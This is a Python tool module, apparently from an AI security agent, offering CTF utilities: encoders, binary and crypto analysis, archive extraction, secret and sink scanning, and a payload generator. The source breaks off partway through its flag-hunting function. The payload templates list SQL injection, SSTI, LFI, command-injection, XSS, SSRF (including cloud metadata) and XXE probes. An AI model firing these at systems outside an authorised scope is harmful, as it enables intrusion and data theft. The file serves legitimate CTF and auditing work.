"""CTF / AWD / 取证与本地分析工具。

覆盖 CTF 常见场景：编码解码、Web payload、TCP 服务交互、ELF/PE 检查、
Crypto 基础分析、文件/压缩包分析、flag 提取与源码秘密扫描。
"""

from __future__ import annotations

import asyncio
import base64
import bz2
import codecs
import gzip
import hashlib
import html
import io
import json
import lzma
import math
import re
import ssl
import struct
import tarfile
import zipfile
from pathlib import Path
from typing import Any
from urllib.parse import quote, unquote

from langchain_core.tools import BaseTool, tool

from sssec.agent.runtime import AgentContext
from sssec.agent.toolkit import (
    err,
    extract_flags,
    normalize_host,
    ok,
    printable_strings,
    safe_workspace_path,
    truncate_middle,
)

MORSE = {
    "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.",
    "G": "--.", "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..",
    "M": "--", "N": "-.", "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.",
    "S": "...", "T": "-", "U": "..-", "V": "...-", "W": ".--", "X": "-..-",
    "Y": "-.--", "Z": "--..", "0": "-----", "1": ".----", "2": "..---",
    "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...",
    "8": "---..", "9": "----.",
}
MORSE_REVERSE = {value: key for key, value in MORSE.items()}

SECRET_PATTERNS = {
    "aws_access_key": r"AKIA[0-9A-Z]{16}",
    "aws_session_key": r"ASIA[0-9A-Z]{16}",
    "openai_key": r"sk-[A-Za-z0-9]{20,}",
    "github_token": r"gh[pousr]_[A-Za-z0-9]{20,}",
    "slack_token": r"xox[baprs]-[A-Za-z0-9-]{10,}",
    "private_key": r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
    "jwt": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    "password_assign": r"(?i)(?:password|passwd|pwd)\s*[:=]\s*[\"'][^\"'\r\n]{3,80}[\"']",
    "token_assign": r"(?i)(?:token|secret|api[_-]?key)\s*[:=]\s*[\"'][^\"'\r\n]{8,120}[\"']",
    "database_uri": r"(?:mysql|postgres(?:ql)?|mongodb|redis|jdbc)[^\s\"'<>]{5,200}",
}

SINK_PATTERNS = {
    "command_exec": r"(?:os\.system|subprocess\.(?:run|Popen|call)|child_process\.(?:exec|spawn)|system\(|popen\()",
    "code_exec": r"(?:eval\(|exec\(|Function\(|setTimeout\(\s*[\"'])",
    "deserialization": r"(?:pickle\.loads|yaml\.load\(|unserialize\(|ObjectInputStream)",
    "template_injection": r"(?:render_template_string|Template\(|jinja2\.Template)",
    "sql_concat": r"(?i)(?:select|insert|update|delete)\b[^;\n]{0,120}(?:\+|%s|\|\|)",
    "path_include": r"(?:include|require)(?:_once)?\s*\(?\s*\$_(?:GET|POST|REQUEST)",
    "xss_sink": r"(?:innerHTML|dangerouslySetInnerHTML|document\.write|v-html)",
    "ssrf_sink": r"(?:requests\.(?:get|post)|httpx\.(?:get|post)|urllib\.request|axios\.(?:get|post))\(",
}


# --------------------------------------------------------------------------- codec
def _as_bytes(text: str) -> bytes:
    return str(text or "").encode("utf-8")


def _decode_output(data: bytes) -> str:
    return data.decode("utf-8", errors="replace")


def _parse_shift(value: Any, default: int = 3) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def _codec(
    ctx: AgentContext,
    data: str,
    operation: str = "encode",
    format: str = "base64",
    key: str = "",
) -> str:
    text = str(data or "")
    if len(text) > 40000:
        return err("输入过长（上限 40000 字符）")
    op = str(operation or "encode").strip().lower()
    fmt = str(format or "base64").strip().lower()
    if op == "hash":
        if fmt not in ("md5", "sha1", "sha256", "sha512"):
            return err("哈希格式支持 md5、sha1、sha256、sha512")
        return ok(
            {
                "operation": "hash",
                "format": fmt,
                "output": hashlib.new(fmt, _as_bytes(text)).hexdigest(),
                "input_length": len(text),
            }
        )
    if op not in ("encode", "decode"):
        return err("operation 只支持 encode / decode / hash")
    try:
        if fmt in ("base64", "b64"):
            output = (
                base64.b64encode(_as_bytes(text)).decode("ascii")
                if op == "encode"
                else _decode_output(base64.b64decode(text + "=" * (-len(text) % 4)))
            )
        elif fmt in ("base64url", "b64url"):
            output = (
                base64.urlsafe_b64encode(_as_bytes(text)).decode("ascii")
                if op == "encode"
                else _decode_output(
                    base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))
                )
            )
        elif fmt in ("base32", "b32"):
            output = (
                base64.b32encode(_as_bytes(text)).decode("ascii")
                if op == "encode"
                else _decode_output(base64.b32decode(text + "=" * (-len(text) % 8)))
            )
        elif fmt in ("base85", "b85"):
            output = (
                base64.b85encode(_as_bytes(text)).decode("ascii")
                if op == "encode"
                else _decode_output(base64.b85decode(text))
            )
        elif fmt == "ascii85":
            output = (
                base64.a85encode(_as_bytes(text)).decode("ascii")
                if op == "encode"
                else _decode_output(base64.a85decode(text))
            )
        elif fmt == "hex":
            output = (
                _as_bytes(text).hex()
                if op == "encode"
                else _decode_output(bytes.fromhex(re.sub(r"[\s:]", "", text)))
            )
        elif fmt in ("url", "urlencode"):
            output = quote(text, safe="") if op == "encode" else unquote(text)
        elif fmt == "html":
            output = html.escape(text) if op == "encode" else html.unescape(text)
        elif fmt in ("unicode", "js"):
            output = (
                "".join(f"\\u{ord(ch):04x}" for ch in text)
                if op == "encode"
                else codecs.decode(text, "unicode_escape")
            )
        elif fmt == "binary":
            output = (
                " ".join(f"{byte:08b}" for byte in _as_bytes(text))
                if op == "encode"
                else _decode_output(
                    bytes(int(part, 2) for part in re.findall(r"[01]{8}", text))
                )
            )
        elif fmt == "rot13":
            output = codecs.encode(text, "rot_13")
        elif fmt == "caesar":
            shift = _parse_shift(key, 3) % 26
            if op == "decode":
                shift = (-shift) % 26
            output = "".join(
                chr((ord(ch) - 65 + shift) % 26 + 65)
                if "A" <= ch <= "Z"
                else chr((ord(ch) - 97 + shift) % 26 + 97)
                if "a" <= ch <= "z"
                else ch
                for ch in text
            )
        elif fmt == "morse":
            if op == "encode":
                output = " / ".join(
                    " ".join(MORSE.get(ch.upper(), "?") for ch in word)
                    for word in text.split()
                )
            else:
                output = " ".join(
                    "".join(MORSE_REVERSE.get(part, "?") for part in word.split())
                    for word in text.replace("/", " / ").split(" / ")
                )
        elif fmt == "json":
            output = (
                json.dumps(text, ensure_ascii=False)
                if op == "encode"
                else json.dumps(json.loads(text), ensure_ascii=False, indent=2)
            )
        else:
            return err(
                "不支持的格式：base64/base64url/base32/base85/ascii85/hex/url/html/"
                "unicode/binary/rot13/caesar/morse/json"
            )
    except Exception as exc:
        return err(f"{op} 失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    return ok(
        {
            "operation": op,
            "format": fmt,
            "input_length": len(text),
            "output": truncate_middle(str(output), 20000),
        }
    )


# ---------------------------------------------------------------------- payloads
PAYLOAD_TEMPLATES = {
    "sqli": [
        ("' OR '1'='1", "经典布尔注入"),
        ("' UNION SELECT NULL-- -", "列数探测起点"),
        ("' AND 1=1-- -", "布尔真条件"),
        ("' AND 1=2-- -", "布尔假条件"),
        ("admin'-- -", "登录绕过"),
        ("' OR SLEEP(3)-- -", "时间盲注（谨慎使用）"),
    ],
    "ssti": [
        ("{{7*7}}", "Jinja2/Twig 基础探测"),
        ("${7*7}", "JSP/EL 探测"),
        ("<%= 7*7 %>", "ERB 探测"),
        ("#{7*7}", "Ruby 探测"),
        ("{{config}}", "Jinja2 配置读取"),
    ],
    "lfi": [
        ("../../../../etc/passwd", "Linux 路径穿越"),
        ("....//....//....//etc/passwd", "过滤绕过"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP 源码读取"),
        ("/proc/self/environ", "环境变量读取"),
    ],
    "cmd": [
        (";id", "分号拼接"),
        ("|whoami", "管道"),
        ("$(id)", "命令替换"),
        ("`id`", "反引号"),
        ("%0aid", "换行编码"),
    ],
    "xss": [
        ("<script>alert(1)</script>", "基础脚本"),
        ('"><img src=x onerror=alert(1)>', "属性逃逸"),
        ("javascript:alert(1)", "伪协议"),
        ("<svg onload=alert(1)>", "SVG 触发"),
    ],
    "ssrf": [
        ("http://127.0.0.1:80/", "本地回环"),
        ("http://169.254.169.254/latest/meta-data/", "云元数据"),
        ("file:///etc/passwd", "文件协议"),
        ("gopher://127.0.0.1:6379/_INFO", "gopher 探测"),
    ],
    "redirect": [
        ("//example.com", "协议相对跳转"),
        ("https://example.com", "绝对跳转"),
        ("/\\example.com", "反斜杠绕过"),
    ],
    "xxe": [
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>', "文件读取"),
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:80/">]><x>&e;</x>', "SSRF"),
    ],
}


def _payload_forge(
    ctx: AgentContext,
    category: str,
    context: str = "",
    encoding: str = "",
) -> str:
    kind = str(category or "").strip().lower()
    if kind not in PAYLOAD_TEMPLATES:
        return err(f"不支持的类别：{', '.join(PAYLOAD_TEMPLATES)}")
    items = []
    for payload, note in PAYLOAD_TEMPLATES[kind]:
        value = payload
        if encoding == "url":
            value = quote(payload, safe="")
        elif encoding == "double_url":
            value = quote(quote(payload, safe=""), safe="")
        elif encoding == "base64":
            value = base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            value = payload.encode().hex()
        items.append(
            {
                "payload": value,
                "note": note,
                "context": context[:500],
                "encoding": encoding,
            }
        )
    return ok({"category": kind, "payloads": items, "count": len(items)})


# ------------------------------------------------------------------- tcp exchange
async def _tcp_exchange(
    ctx: AgentContext,
    host: str,
    port: int,
    data: str,
    timeout_ms: int = 2000,
    read_until: str = "",
    hex_input: bool = False,
    tls: bool = False,
    insecure: bool = False,
) -> str:
    host = normalize_host(host)
    if not host:
        return err("主机名无效")
    decision = ctx.check_host(host)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    try:
        port = int(port)
    except (TypeError, ValueError):
        return err("端口无效")
    if not 1 <= port <= 65535:
        return err("端口超出范围")
    try:
        payload = bytes.fromhex(re.sub(r"[\s:]", "", data)) if hex_input else str(data).encode()
    except ValueError:
        return err("hex_input=True 时 data 必须是合法十六进制")
    if len(payload) > 2_000_000:
        return err("发送数据超过 2 MB")
    timeout = max(0.2, min(30.0, int(timeout_ms) / 1000.0))
    writer = None
    try:
        ssl_context = ssl.create_default_context() if tls else None
        if ssl_context is not None and insecure:
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host,
                port,
                ssl=ssl_context,
                server_hostname=host if tls else None,
            ),
            timeout=timeout,
        )
        if payload:
            writer.write(payload)
            await writer.drain()
        chunks: list[bytes] = []
        total = 0
        marker = str(read_until or "").encode()
        while total < 200_000:
            try:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=timeout)
            except asyncio.TimeoutError:
                break
            if not chunk:
                break
            chunks.append(chunk)
            total += len(chunk)
            if marker and marker in b"".join(chunks):
                break
        raw = b"".join(chunks)
        return ok(
            {
                "host": host,
                "port": port,
                "tls": bool(tls),
                "sent_bytes": len(payload),
                "received_bytes": len(raw),
                "received_text": raw.decode("utf-8", errors="replace")[:20000],
                "received_hex": raw[:2000].hex(),
                "truncated": total >= 200_000,
            }
        )
    except (OSError, asyncio.TimeoutError) as exc:
        return err(f"TCP 交互失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    finally:
        if writer is not None:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass


# ------------------------------------------------------------------ binary info
MACHINE = {
    3: "x86", 8: "MIPS", 20: "PowerPC", 40: "ARM", 62: "x86-64",
    183: "AArch64", 243: "RISC-V",
}


def _elf_info(data: bytes) -> dict[str, Any]:
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return {}
    bits = 64 if data[4] == 2 else 32
    endian = "<" if data[5] == 1 else ">"
    result: dict[str, Any] = {"format": "ELF", "bits": bits, "endian": "little" if endian == "<" else "big"}
    try:
        if bits == 64:
            values = struct.unpack_from(endian + "HHIQQQIHHHHHH", data, 16)
        else:
            values = struct.unpack_from(endian + "HHIIIIIHHHHHH", data, 16)
        e_type, e_machine, _version, e_entry, e_phoff, _e_shoff, _flags, _ehsize, e_phentsize, e_phnum, *_rest = values
        result.update(
            {
                "type": {1: "REL", 2: "EXEC", 3: "DYN", 4: "CORE"}.get(e_type, e_type),
                "machine": MACHINE.get(e_machine, e_machine),
                "entry": hex(e_entry),
                "pie": e_type == 3,
                "nx": None,
                "relro": False,
            }
        )
        for index in range(min(int(e_phnum), 64)):
            offset = int(e_phoff) + index * int(e_phentsize)
            if offset + int(e_phentsize) > len(data):
                break
            if bits == 64:
                p_type, p_flags, _off, _vaddr, _paddr, _filesz, _memsz, _align = struct.unpack_from(
                    endian + "IIQQQQQQ", data, offset
                )
            else:
                p_type, p_flags, _off, _vaddr, _paddr, _filesz, _memsz, _align = struct.unpack_from(
                    endian + "IIIIIIII", data, offset
                )
            if p_type == 0x6474E551:  # PT_GNU_STACK
                result["nx"] = not bool(p_flags & 0x1)
            if p_type == 0x6474E552:  # PT_GNU_RELRO
                result["relro"] = True
        result["canary"] = b"__stack_chk_fail" in data
        result["stripped"] = b".symtab" not in data
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
    return result


def _pe_info(data: bytes) -> dict[str, Any]:
    if len(data) < 0x40 or data[:2] != b"MZ":
        return {}
    try:
        offset = struct.unpack_from("<I", data, 0x3C)[0]
        if data[offset : offset + 4] != b"PE\x00\x00":
            return {}
        machine, _sections, _timestamp, _symptr, _nsyms, opt_size, characteristics = struct.unpack_from(
            "<HHIIIHH", data, offset + 4
        )
        optional = offset + 24
        magic = struct.unpack_from("<H", data, optional)[0]
        bits = 64 if magic == 0x20B else 32
        entry = struct.unpack_from("<I", data, optional + 16)[0]
        image_base_offset = optional + (24 if bits == 64 else 28)
        image_base = struct.unpack_from(
            "<Q" if bits == 64 else "<I", data, image_base_offset
        )[0]
        return {
            "format": "PE",
            "bits": bits,
            "machine": {
                0x14C: "x86", 0x8664: "x86-64", 0xAA64: "ARM64", 0x1C0: "ARM",
            }.get(machine, hex(machine)),
            "dll": bool(characteristics & 0x2000),
            "entry": hex(entry),
            "image_base": hex(image_base),
            "optional_header_size": opt_size,
        }
    except Exception as exc:
        return {"format": "PE", "error": f"{type(exc).__name__}: {exc}"}


def _binary_info(ctx: AgentContext, path: str) -> str:
    try:
        target = safe_workspace_path(ctx.workspace, path)
    except ValueError as exc:
        return err(str(exc))
    if not target.exists() or not target.is_file():
        return err("文件不存在")
    data = target.read_bytes()[:4_000_000]
    info = _elf_info(data) or _pe_info(data)
    if not info:
        info = {"format": "unknown", "magic": data[:16].hex()}
    info["size"] = len(data)
    info["sha256"] = hashlib.sha256(data).hexdigest()
    info["strings"] = printable_strings(data[:2_000_000], minimum=4, limit=60)
    return ok(info)


def _capstone_arch(machine: str, bits: int, override: str):
    from capstone import (
        CS_ARCH_ARM,
        CS_ARCH_ARM64,
        CS_ARCH_MIPS,
        CS_ARCH_X86,
        CS_MODE_32,
        CS_MODE_64,
        CS_MODE_ARM,
        CS_MODE_MIPS32,
        CS_MODE_THUMB,
        Cs,
    )

    name = (override or "auto").lower()
    if name == "auto":
        if "arm64" in machine or "aarch64" in machine:
            name = "arm64"
        elif "arm" in machine:
            name = "arm"
        elif "mips" in machine:
            name = "mips"
        elif "x86-64" in machine or "x86_64" in machine or bits == 64:
            name = "x86_64"
        else:
            name = "x86"
    if name in {"x86_64", "x64", "amd64"}:
        return Cs(CS_ARCH_X86, CS_MODE_64), "x86_64"
    if name in {"x86", "i386", "x32"}:
        return Cs(CS_ARCH_X86, CS_MODE_32), "x86"
    if name in {"arm64", "aarch64"}:
        return Cs(CS_ARCH_ARM64, CS_MODE_ARM), "arm64"
    if name == "arm":
        return Cs(CS_ARCH_ARM, CS_MODE_ARM | CS_MODE_THUMB), "arm"
    if name == "mips":
        return Cs(CS_ARCH_MIPS, CS_MODE_MIPS32), "mips"
    raise ValueError(f"不支持的架构：{name}")


def _disassemble(
    ctx: AgentContext,
    path: str,
    start: int = 0,
    count: int = 40,
    architecture: str = "auto",
) -> str:
    """对工作区 ELF/PE 的 .text 做静态反汇编，辅助逆向与固件分析。"""
    try:
        target = safe_workspace_path(ctx.workspace, path)
    except ValueError as exc:
        return err(str(exc))
    if not target.exists() or not target.is_file():
        return err("文件不存在")
    data = target.read_bytes()[:16_000_000]
    if not data:
        return err("文件为空")
    blob = data
    base = 0
    section_name = ""
    entry = 0
    machine = "unknown"
    bits = 64
    fmt = "raw"
    try:
        if data[:4] == b"\x7fELF":
            fmt = "ELF"
            from elftools.elf.elffile import ELFFile

            with target.open("rb") as handle:
                elf = ELFFile(handle)
                bits = 64 if elf.elfclass == 64 else 32
                machine = str(elf.get_machine_arch() or "unknown").lower()
                entry = int(elf.header.e_entry)
                section = elf.get_section_by_name(".text")
                if section is not None:
                    blob = section.data()
                    base = int(section.header.sh_addr)
                    section_name = ".text"
        elif data[:2] == b"MZ":
            fmt = "PE"
            import pefile

            pe = pefile.PE(data=data, fast_load=True)
            machine = {
                0x14C: "x86",
                0x8664: "x86-64",
                0xAA64: "arm64",
                0x1C0: "arm",
            }.get(pe.FILE_HEADER.Machine, "unknown")
            bits = 64 if pe.PE_TYPE == 0x20B else 32
            image_base = int(pe.OPTIONAL_HEADER.ImageBase)
            entry = image_base + int(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
            for section in pe.sections:
                if section.Name.rstrip(b"\x00") == b".text":
                    blob = section.get_data()
                    base = image_base + int(section.VirtualAddress)
                    section_name = ".text"
                    break
    except Exception as exc:
        return err(f"解析二进制失败：{type(exc).__name__}: {str(exc)[:300]}")

    if start and start >= base and base:
        offset = int(start) - base
    else:
        offset = int(start or 0)
    if offset < 0 or offset >= len(blob):
        offset = 0
    try:
        cs, arch_name = _capstone_arch(machine, bits, architecture)
    except Exception as exc:
        return err(f"反汇编架构初始化失败：{type(exc).__name__}: {str(exc)[:300]}")
    cs.detail = False
    instructions = []
    for instruction in cs.disasm(blob[offset:], base + offset):
        instructions.append(
            {
                "address": hex(instruction.address),
                "bytes": instruction.bytes.hex(),
                "mnemonic": instruction.mnemonic,
                "op_str": instruction.op_str,
            }
        )
        if len(instructions) >= max(1, min(200, int(count or 40))):
            break
    return ok(
        {
            "path": path,
            "format": fmt,
            "architecture": arch_name,
            "machine": machine,
            "bits": bits,
            "section": section_name or "raw",
            "base": hex(base),
            "entry": hex(entry) if entry else "0x0",
            "start_offset": offset,
            "start_address": hex(base + offset),
            "count": len(instructions),
            "instructions": instructions,
            "note": "start 既可以是文件偏移，也可以是节区内虚拟地址；静态反汇编只提供线索，仍需结合字符串/动态行为判断。",
        }
    )


# ----------------------------------------------------------------- crypto tools
def _score_text(data: bytes) -> float:
    text = data.lower()
    common = b"etaoin shrdlu"
    score = sum(text.count(bytes([char])) for char in common)
    score -= sum(text.count(bytes([char])) for char in b"\x00\x01\x02\x03") * 5
    return float(score)


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data))


def _as_cipher_bytes(value: str) -> bytes:
    text = str(value or "").strip()
    if re.fullmatch(r"(?:[0-9a-fA-F]{2}){4,}", text):
        return bytes.fromhex(text)
    return text.encode("utf-8", errors="replace")


def _crypto_workshop(
    ctx: AgentContext,
    mode: str,
    data: str = "",
    key: str = "",
    wordlist: str = "",
    n: str = "",
    e: str = "",
    c: str = "",
    n2: str = "",
) -> str:
    kind = str(mode or "").strip().lower()
    if len(str(data or "")) > 40000:
        return err("data 过长（上限 40000 字符）")
    try:
        if kind == "single_xor":
            raw = _as_cipher_bytes(data)
            candidates = []
            for candidate in range(256):
                decoded = bytes(byte ^ candidate for byte in raw)
                candidates.append(
                    {
                        "key": candidate,
                        "key_hex": f"{candidate:02x}",
                        "score": round(_score_text(decoded), 2),
                        "text": decoded.decode("utf-8", errors="replace")[:500],
                    }
                )
            candidates.sort(key=lambda item: item["score"], reverse=True)
            return ok({"mode": kind, "candidates": candidates[:8]})
        if kind == "repeating_xor":
            raw = _as_cipher_bytes(data)
            if len(raw) > 10000:
                return err("repeating_xor 密文过长（上限 10000 字节）")
            if key:
                decoded = _xor_bytes(raw, key.encode())
                return ok(
                    {
                        "mode": kind,
                        "key": key,
                        "text": decoded.decode("utf-8", errors="replace")[:20000],
                    }
                )
            candidates = []
            for length in range(1, min(33, max(2, len(raw) // 2))):
                key_bytes = bytearray()
                for position in range(length):
                    column = raw[position::length]
                    best = max(
                        range(256),
                        key=lambda candidate: _score_text(
                            bytes(byte ^ candidate for byte in column)
                        ),
                    )
                    key_bytes.append(best)
                decoded = _xor_bytes(raw, bytes(key_bytes))
                candidates.append(
                    {
                        "key": bytes(key_bytes).decode("latin-1"),
                        "key_hex": bytes(key_bytes).hex(),
                        "length": length,
                        "score": round(_score_text(decoded), 2),
                        "text": decoded.decode("utf-8", errors="replace")[:300],
                    }
                )
            candidates.sort(key=lambda item: item["score"], reverse=True)
            return ok({"mode": kind, "candidates": candidates[:5]})
        if kind == "caesar":
            raw = str(data or "")
            candidates = []
            for shift in range(26):
                decoded = "".join(
                    chr((ord(ch) - 65 - shift) % 26 + 65)
                    if "A" <= ch <= "Z"
                    else chr((ord(ch) - 97 - shift) % 26 + 97)
                    if "a" <= ch <= "z"
                    else ch
                    for ch in raw
                )
                candidates.append(
                    {
                        "shift": shift,
                        "score": round(_score_text(decoded.encode()), 2),
                        "text": decoded[:500],
                    }
                )
            candidates.sort(key=lambda item: item["score"], reverse=True)
            return ok({"mode": kind, "candidates": candidates[:10]})
        if kind == "rsa_info":
            values = {}
            for name, value in (("n", n), ("e", e), ("c", c), ("n2", n2)):
                if value:
                    text = str(value).strip()
                    try:
                        values[name] = int(text, 0)
                    except ValueError:
                        values[name] = int(text, 16)
            if "n" not in values or "e" not in values:
                return err("rsa_info 至少需要 n 和 e")
            modulus = values["n"]
            exponent = values["e"]
            info: dict[str, Any] = {
                "bits": modulus.bit_length(),
                "n_hex": hex(modulus),
                "e": exponent,
                "small_e": exponent in (3, 5, 17, 257),
                "c_provided": "c" in values,
            }
            if "c" in values:
                info["c_ge_n"] = values["c"] >= modulus
            if "n2" in values:
                info["gcd_with_n2"] = math.gcd(modulus, values["n2"])
            return ok(info)
        if kind == "hash_identify":
            value = str(data or "").strip()
            length = len(value)
            table = {
                32: "MD5 / NTLM / MD4",
                40: "SHA1",
                56: "SHA224",
                64: "SHA256 / SHA3-256",
                96: "SHA384",
                128: "SHA512",
            }
            prefix = ""
            if value.startswith("$2"):
                prefix = "bcrypt"
            elif value.startswith("$argon2"):
                prefix = "argon2"
            elif value.startswith("$6$"):
                prefix = "sha512-crypt"
            elif value.startswith("$1$"):
                prefix = "md5-crypt"
            return ok(
                {
                    "hash": value[:200],
                    "length": length,
                    "guess": prefix or table.get(length, "unknown"),
                }
            )
        if kind == "hash_crack":
            target = str(data or "").strip().lower()
            if not target:
                return err("hash_crack 需要 data（哈希值）")
            candidates = [
                "password", "123456", "admin", "root", "secret", "test", "guest",
                "qwerty", "letmein", "welcome", "changeme", "toor", "pass",
                "12345678", "111111", "abc123", "admin123", "P@ssw0rd",
            ]
            if wordlist:
                try:
                    source = safe_workspace_path(ctx.workspace, wordlist)
                    raw_words = source.read_bytes()[:2_000_000].decode(
                        "utf-8", errors="ignore"
                    )
                    candidates.extend(raw_words.splitlines()[:50000])
                except Exception as exc:
                    return err(f"读取字典失败：{type(exc).__name__}: {exc}")
            algorithms = {
                32: ["md5"], 40: ["sha1"], 64: ["sha256"], 96: ["sha384"], 128: ["sha512"],
            }.get(len(target), ["md5", "sha1", "sha256"])
            matches = []
            for candidate in candidates:
                for algorithm in algorithms:
                    if hashlib.new(algorithm, candidate.encode()).hexdigest() == target:
                        matches.append({"password": candidate, "algorithm": algorithm})
                        break
                if len(matches) >= 10:
                    break
            return ok({"hash": target[:200], "matches": matches, "tested": len(candidates)})
        if kind == "freq":
            text = "".join(ch.lower() for ch in str(data or "") if ch.isalpha())
            counts: dict[str, int] = {}
            for char in text:
                counts[char] = counts.get(char, 0) + 1
            total = max(1, len(text))
            ordered = sorted(counts.items(), key=lambda item: item[1], reverse=True)
            return ok(
                {
                    "length": len(text),
                    "frequencies": [
                        {"char": char, "count": count, "ratio": round(count / total, 4)}
                        for char, count in ordered[:20]
                    ],
                }
            )
    except Exception as exc:
        return err(f"crypto_workshop 失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    return err("mode 支持 single_xor、repeating_xor、caesar、rsa_info、hash_identify、hash_crack、freq")


# ------------------------------------------------------------------- file tools
MAGIC = [
    (b"\x7fELF", "ELF"),
    (b"MZ", "PE"),
    (b"\x89PNG\r\n\x1a\n", "PNG"),
    (b"\xff\xd8\xff", "JPEG"),
    (b"GIF8", "GIF"),
    (b"%PDF", "PDF"),
    (b"PK\x03\x04", "ZIP"),
    (b"PK\x05\x06", "ZIP(empty)"),
    (b"\x1f\x8b", "GZIP"),
    (b"BZh", "BZIP2"),
    (b"\xfd7zXZ\x00", "XZ"),
    (b"SQLite format 3\x00", "SQLite"),
    (b"\xd4\xc3\xb2\xa1", "PCAP"),
    (b"\xa1\xb2\xc3\xd4", "PCAP"),
    (b"7z\xbc\xaf\x27\x1c", "7Z"),
    (b"Rar!\x1a\x07", "RAR"),
]

SECRET_RE = {key: re.compile(pattern, re.I) for key, pattern in SECRET_PATTERNS.items()}
SINK_RE = {key: re.compile(pattern, re.I) for key, pattern in SINK_PATTERNS.items()}


def _magic(data: bytes) -> str:
    for signature, name in MAGIC:
        if data.startswith(signature):
            return name
    if len(data) > 262 and data[257:262] == b"ustar":
        return "TAR"
    return "unknown"


def _entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = [0] * 256
    for byte in data:
        counts[byte] += 1
    total = len(data)
    return round(
        -sum((count / total) * math.log2(count / total) for count in counts if count),
        4,
    )


def _file_analyze(ctx: AgentContext, path: str) -> str:
    try:
        target = safe_workspace_path(ctx.workspace, path)
    except ValueError as exc:
        return err(str(exc))
    if not target.exists() or not target.is_file():
        return err("文件不存在")
    data = target.read_bytes()[:2_000_000]
    info: dict[str, Any] = {
        "path": str(target.relative_to(Path(ctx.workspace).resolve())),
        "size": target.stat().st_size,
        "magic": _magic(data),
        "magic_hex": data[:16].hex(),
        "sha256": hashlib.sha256(data).hexdigest(),
        "md5": hashlib.md5(data).hexdigest(),
        "entropy": _entropy(data[:200_000]),
        "strings": printable_strings(data, minimum=4, limit=80),
        "hexdump": "\n".join(
            f"{offset:08x}  "
            + " ".join(f"{byte:02x}" for byte in data[offset : offset + 16])
            + "  "
            + "".join(chr(byte) if 32 <= byte < 127 else "." for byte in data[offset : offset + 16])
            for offset in range(0, min(128, len(data)), 16)
        ),
    }
    if data.startswith(b"PK\x03\x04"):
        try:
            with zipfile.ZipFile(io.BytesIO(data)) as archive:
                info["archive_entries"] = [
                    {"name": entry.filename, "size": entry.file_size}
                    for entry in archive.infolist()[:50]
                ]
        except Exception:
            pass
    return ok(info)


def _safe_member(name: str) -> bool:
    path = Path(name)
    return not path.is_absolute() and ".." not in path.parts


def _archive_extract(
    ctx: AgentContext,
    path: str,
    output_dir: str = ".",
    password: str = "",
) -> str:
    try:
        source = safe_workspace_path(ctx.workspace, path)
        destination = safe_workspace_path(ctx.workspace, output_dir)
    except ValueError as exc:
        return err(str(exc))
    if not source.exists() or not source.is_file():
        return err("压缩包不存在")
    destination.mkdir(parents=True, exist_ok=True)
    extracted: list[dict[str, Any]] = []
    try:
        if zipfile.is_zipfile(source):
            with zipfile.ZipFile(source) as archive:
                if password:
                    archive.setpassword(password.encode())
                for item in archive.infolist()[:500]:
                    if not _safe_member(item.filename):
                        continue
                    total = sum(entry["size"] for entry in extracted)
                    if total + item.file_size > 100 * 1024 * 1024:
                        break
                    archive.extract(item, destination)
                    extracted.append(
                        {
                            "name": item.filename,
                            "size": item.file_size,
                            "path": str((destination / item.filename).resolve()),
                        }
                    )
        elif tarfile.is_tarfile(source):
            with tarfile.open(source) as archive:
                for item in archive.getmembers()[:500]:
                    if not item.isfile() or not _safe_member(item.name):
                        continue
                    total = sum(entry["size"] for entry in extracted)
                    if total + item.size > 100 * 1024 * 1024:
                        break
                    try:
                        archive.extract(item, destination, filter="data")
                    except TypeError:
                        # Python 3.10/3.11 早期版本没有 filter 参数；
                        # _safe_member 已经拒绝了绝对路径与目录穿越。
                        archive.extract(item, destination)
                    extracted.append(
                        {
                            "name": item.name,
                            "size": item.size,
                            "path": str((destination / item.name).resolve()),
                        }
                    )
        else:
            data = source.read_bytes()
            if source.suffix.lower() == ".gz":
                data = gzip.decompress(data)
            elif source.suffix.lower() == ".bz2":
                data = bz2.decompress(data)
            elif source.suffix.lower() in (".xz", ".lzma"):
                data = lzma.decompress(data)
            else:
                return err("只支持 zip、tar、gz、bz2、xz/lzma")
            output = destination / source.stem
            output.write_bytes(data)
            extracted.append({"name": output.name, "size": len(data), "path": str(output)})
    except Exception as exc:
        return err(f"解压失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    return ok(
        {
            "source": str(source.name),
            "output_dir": str(destination),
            "extracted": extracted,
            "count": len(extracted),
        }
    )


# ------------------------------------------------------------------ flag/secret
def _flag_hunt(ctx: AgentContext, path: str = ".", text: str = "") -> str:
    if text:
        flags = extract_flags(text)
        return ok({"source": "text", "flags": flags, "count": len(flags)})
    try:
        root = safe_workspace_path(ctx.workspace, path)
    except ValueError as exc:
        return err(str(exc))
    if not root.exists():
        return err("路径不存在")
    files = [root] if root.is_file() else [
        item for item in root.rglob("*") if item.is_file()
    ]
